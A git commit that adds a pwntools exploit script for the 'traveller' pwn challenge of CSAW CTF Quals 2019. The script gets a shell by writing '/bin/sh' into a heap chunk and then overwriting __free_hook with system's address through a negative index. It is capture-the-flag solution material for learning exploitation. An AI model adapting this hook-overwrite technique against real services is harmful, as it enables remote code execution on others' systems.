d3c07af977150186da4a39cca438828785004bc8
tin-z <tinz@@>
2019-09-16 09:43:37 +0200

    csaw-quals-2019

---
+++ CTF/csaw-ctf-quals-2019/solution_travller.py
@@ -0,0 +1,25 @@
+from pwn import *
+
+r = remote("pwn.chal.csaw.io", 1003)
+
+# special chunk
+r.recvuntil(">")
+r.sendline('1')
+r.sendline('3')
+r.recvuntil('Destination')
+r.sendline('/bin/sh')
+
+# overwrite __free_hook with (system@plt+6)
+r.recvuntil(">")
+r.sendline('2')
+r.sendline(str( -262194 ))
+r.recvuntil('trip:')
+r.send(p64(0x400716))
+
+# free something
+r.recvuntil(">")
+r.sendline('3')
+r.recvuntil("delete:")
+r.sendline('0')
+
+r.interactive()
